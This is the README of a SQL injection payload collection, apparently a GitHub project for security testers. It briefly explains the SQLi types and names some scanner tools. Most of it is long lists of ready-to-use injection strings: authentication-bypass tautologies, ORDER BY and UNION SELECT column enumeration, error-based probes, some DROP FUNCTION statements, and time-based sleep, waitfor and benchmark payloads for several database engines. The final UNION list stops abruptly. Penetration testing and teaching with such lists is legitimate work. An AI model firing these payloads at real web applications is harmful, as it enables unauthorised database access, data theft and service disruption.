# SQL Injection Payload List

![License](https://img.shields.io/github/license/ismailtasdelen/sql-injection-payload-list)
![Open Source](https://img.shields.io/badge/Open%20Source-%E2%9D%A4-red)
![Security](https://img.shields.io/badge/Security-Payloads-blue)

The primary goal of this project is to explain SQL Injection (one of the OWASP Top 10 vulnerabilities) and to provide a beneficial resource for the security community.

<img src="https://github.com/payload-box/sql-injection-payload-list/blob/main/assets/sql-injection-payload-list-ismailtasdelen.jpeg">

## 🚀 Quick Links

- [All-in-One Burp Suite List](file:///Users/ismailtasdelen/Documents/GitHub/sql-injection-payload-list/burp-intruder-payloads.txt)
- [MySQL Payloads](file:///Users/ismailtasdelen/Documents/GitHub/sql-injection-payload-list/mysql-payloads.txt)
- [PostgreSQL Payloads](file:///Users/ismailtasdelen/Documents/GitHub/sql-injection-payload-list/postgresql-payloads.txt)
- [MSSQL Payloads](file:///Users/ismailtasdelen/Documents/GitHub/sql-injection-payload-list/mssql-payloads.txt)
- [SQLite Payloads](file:///Users/ismailtasdelen/Documents/GitHub/sql-injection-payload-list/sqlite-payloads.txt)
- [Oracle Payloads](file:///Users/ismailtasdelen/Documents/GitHub/sql-injection-payload-list/oracle-payloads.txt)
- [Vulnerable Lab (Docker)](file:///Users/ismailtasdelen/Documents/GitHub/sql-injection-payload-list/lab/)
- [Payload Generator Script](file:///Users/ismailtasdelen/Documents/GitHub/sql-injection-payload-list/scripts/generator.py)

## What is SQL Injection?

In this section, we'll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.

### What is SQL injection (SQLi)?

SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.

## SQL Injection Types

| SQL Injection Type | Description |
| --- | --- |
| **In-band SQLi (Classic SQLi)** | In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi. |
| **Error-based SQLi** | Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database. |
| **Union-based SQLi** | Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response. |
| **Inferential SQLi (Blind SQLi)** | Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit, however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as “blind SQL Injection attacks”). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application’s response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi. |
| **Boolean-based (content-based) Blind SQLi** | Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned. |
| **Time-based Blind SQLi** | Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. Depending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned. |
| **Out-of-band SQLi** | Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable). |
| **Voice Based SQL Injection** | It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound. |

## SQL Injection Vulnerability Scanner Tools

- **SQLMap** – Automatic SQL Injection And Database Takeover Tool
- **jSQL Injection** – Java Tool For Automatic SQL Database Injection
- **BBQSQL** – A Blind SQL-Injection Exploitation Tool
- **NoSQLMap** – Automated NoSQL Database Pwnage
- **Whitewidow** – SQL Vulnerability Scanner
- **DSSS** – Damn Small SQLi Scanner
- **explo** – Human And Machine Readable Web Vulnerability Testing Format
- **Blind-Sql-Bitshifting** – Blind SQL-Injection via Bitshifting
- **Leviathan** – Wide Range Mass Audit Toolkit
- **Blisqy** – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)

## Generic SQL Injection Payloads

```sql
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/ 
+  addition, concatenate (or space in url)
||  (double pipe) concatenate
%  wildcard attribute indicator

@variable local variable
@@variable global variable
```

### Numeric

```sql
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2
```

### Table and Column Discovery

```sql
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+

1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+

1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --

-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --

-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@

1 AND (SELECT * FROM Users) = 1 

' AND MID(VERSION(),1,1) = '5';

' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
```

### Time-Based

```sql
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
```

### Comments

```sql
#     Hash comment
/*   C-style comment
-- - SQL comment
;%00 Nullbyte
`     Backtick
```

## Generic Error Based Payloads

```sql
 OR 1=1
 OR 1=0
 OR x=x
 OR x=y
 OR 1=1#
 OR 1=0#
 OR x=x#
 OR x=y#
 OR 1=1-- 
 OR 1=0-- 
 OR x=x-- 
 OR x=y-- 
 OR 3409=3409 AND ('pytW' LIKE 'pytW
 OR 3409=3409 AND ('pytW' LIKE 'pytY
 HAVING 1=1
 HAVING 1=0
 HAVING 1=1#
 HAVING 1=0#
 HAVING 1=1-- 
 HAVING 1=0-- 
 AND 1=1
 AND 1=0
 AND 1=1-- 
 AND 1=0-- 
 AND 1=1#
 AND 1=0#
 AND 1=1 AND '%'='
 AND 1=0 AND '%'='
 AND 1083=1083 AND (1427=1427
 AND 7506=9091 AND (5913=5913
 AND 1083=1083 AND ('1427=1427
 AND 7506=9091 AND ('5913=5913
 AND 7300=7300 AND 'pKlZ'='pKlZ
 AND 7300=7300 AND 'pKlZ'='pKlY
 AND 7300=7300 AND ('pKlZ'='pKlZ
 AND 7300=7300 AND ('pKlZ'='pKlY
 AS INJECTX WHERE 1=1 AND 1=1
 AS INJECTX WHERE 1=1 AND 1=0
 AS INJECTX WHERE 1=1 AND 1=1#
 AS INJECTX WHERE 1=1 AND 1=0#
 AS INJECTX WHERE 1=1 AND 1=1--
 AS INJECTX WHERE 1=1 AND 1=0--
 WHERE 1=1 AND 1=1
 WHERE 1=1 AND 1=0
 WHERE 1=1 AND 1=1#
 WHERE 1=1 AND 1=0#
 WHERE 1=1 AND 1=1--
 WHERE 1=1 AND 1=0--
```

### Order By Payloads

```sql
 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 8-- 
 ORDER BY 9-- 
 ORDER BY 10-- 
 ORDER BY 11-- 
 ORDER BY 12-- 
 ORDER BY 13-- 
 ORDER BY 14-- 
 ORDER BY 15-- 
 ORDER BY 16-- 
 ORDER BY 17-- 
 ORDER BY 18-- 
 ORDER BY 19-- 
 ORDER BY 20-- 
 ORDER BY 21-- 
 ORDER BY 22-- 
 ORDER BY 23-- 
 ORDER BY 24-- 
 ORDER BY 25-- 
 ORDER BY 26-- 
 ORDER BY 27-- 
 ORDER BY 28-- 
 ORDER BY 29-- 
 ORDER BY 30-- 
 ORDER BY 31337-- 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 8# 
 ORDER BY 9# 
 ORDER BY 10# 
 ORDER BY 11# 
 ORDER BY 12# 
 ORDER BY 13# 
 ORDER BY 14# 
 ORDER BY 15# 
 ORDER BY 16# 
 ORDER BY 17# 
 ORDER BY 18# 
 ORDER BY 19# 
 ORDER BY 20# 
 ORDER BY 21# 
 ORDER BY 22# 
 ORDER BY 23# 
 ORDER BY 24# 
 ORDER BY 25# 
 ORDER BY 26# 
 ORDER BY 27# 
 ORDER BY 28# 
 ORDER BY 29# 
 ORDER BY 30#
 ORDER BY 31337#
 ORDER BY 1 
 ORDER BY 2 
 ORDER BY 3 
 ORDER BY 4 
 ORDER BY 5 
 ORDER BY 6 
 ORDER BY 7 
 ORDER BY 8 
 ORDER BY 9 
 ORDER BY 10 
 ORDER BY 11 
 ORDER BY 12 
 ORDER BY 13 
 ORDER BY 14 
 ORDER BY 15 
 ORDER BY 16 
 ORDER BY 17 
 ORDER BY 18 
 ORDER BY 19 
 ORDER BY 20 
 ORDER BY 21 
 ORDER BY 22 
 ORDER BY 23 
 ORDER BY 24 
 ORDER BY 25 
 ORDER BY 26 
 ORDER BY 27 
 ORDER BY 28 
 ORDER BY 29 
 ORDER BY 30 
 ORDER BY 31337 
```

### Misc Error-Based

```sql
 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
%' AND 8310=8310 AND '%'='
%' AND 8310=8311 AND '%'='
 and (select substring(@@version,1,1))='X'
 and (select substring(@@version,1,1))='M'
 and (select substring(@@version,2,1))='i'
 and (select substring(@@version,2,1))='y'
 and (select substring(@@version,3,1))='c'
 and (select substring(@@version,3,1))='S'
 and (select substring(@@version,3,1))='X'
```

## Generic Time Based SQL Injection Payloads

```sql
# from wapiti
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Generic Union Select Payloads

```sql
 ORDER BY SLEEP(5)
 ORDER BY 1,SLEEP(5)
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
 ORDER BY SLEEP(5)#
 ORDER BY 1,SLEEP(5)#
 ORDER BY 1,SLEEP(5),3#
 ORDER BY 1,SLEEP(5),3,4#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
 ORDER BY SLEEP(5)-- 
 ORDER BY 1,SLEEP(5)-- 
 ORDER BY 1,SLEEP(5),3-- 
 ORDER BY 1,SLEEP(5),3,4-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
 ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
 UNION ALL SELECT 1
 UNION ALL SELECT 1,2
 UNION ALL SELECT 1,2,3
 UNION ALL SELECT 1,2,3,4
 UNION ALL SELECT 1,2,3,4,5
 UNION ALL SELECT 1,2,3,4,5,6
 UNION ALL SELECT 1,2,3,4,5,6,7
 UNION ALL SELECT 1,2,3,4,5,6,7,8
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
 UNION ALL SELECT 1#
 UNION ALL SELECT 1,2#
 UNION ALL SELECT 1,2,3#
 UNION ALL SELECT 1,2,3,4#
 UNION ALL SELECT 1,2,3,4,5#
 UNION ALL SELECT 1,2,3,4,5,6#
 UNION ALL SELECT 1,2,3,4,5,6,7#
 UNION ALL SELECT 1,2,3,4,5,6,7,8#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
